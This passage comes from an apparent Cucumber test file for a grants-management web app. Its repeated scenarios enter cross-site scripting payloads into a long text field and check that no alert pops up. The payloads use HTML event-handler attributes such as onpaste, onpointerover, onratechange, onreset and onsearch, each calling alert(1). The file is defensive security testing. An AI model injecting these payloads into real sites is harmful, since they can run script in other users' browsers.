      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304248 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                          | Field                          |
      | <a onpaste="alert(1)" contenteditable>test</a> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304249 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                            | Field                          |
      | <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304251 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                          |
      | <xss onpointerdown=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304253 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                          |
      | <xss onpointerenter=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304255 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                          |
      | <xss onpointerleave=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304257 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                          |
      | <xss onpointermove=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304261 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                    | Field                          |
      | <xss onpointerout=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304318 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                          |
      | <xss onpointerover=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304322 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                          | Field                          |
      | <xss onpointerrawupdate=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304323 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                   | Field                          |
      | <xss onpointerup=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304327 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                 | Field                          |
      | <audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304329 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                     | Field                          |
      | <form onreset=alert(1)><input type=reset> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304356 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                    | Field                          |
      | <form><input type=search onsearch=alert(1) value="Hit return" autofocus> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

################## Data Type - Text Area - Dilip ###################

